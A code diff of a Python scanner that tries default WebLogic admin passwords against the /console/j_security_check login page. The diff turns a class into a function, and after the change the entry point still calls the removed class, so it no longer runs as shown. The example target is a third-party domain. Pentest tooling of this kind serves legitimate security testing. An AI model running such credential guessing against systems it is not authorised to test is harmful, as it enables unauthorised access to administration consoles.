@@ -10,13 +10,7 @@ import sys
 import json
 import warnings
 import requests
-
-
-class weak_pass:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['weblogic 弱口令漏洞', '', '']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
@@ -24,7 +18,7 @@ class weak_pass:
         }
         payload = "/console/j_security_check"
         passwd = ["weblogic", "weblogic1", "weblogic12", "weblogic123"]
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         for pwd in passwd:
             post_data = {
                 "j_username":"weblogic",
@@ -43,4 +37,3 @@ class weak_pass:
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
     testVuln = weak_pass("http://baidu.com")
-    testVuln.run()
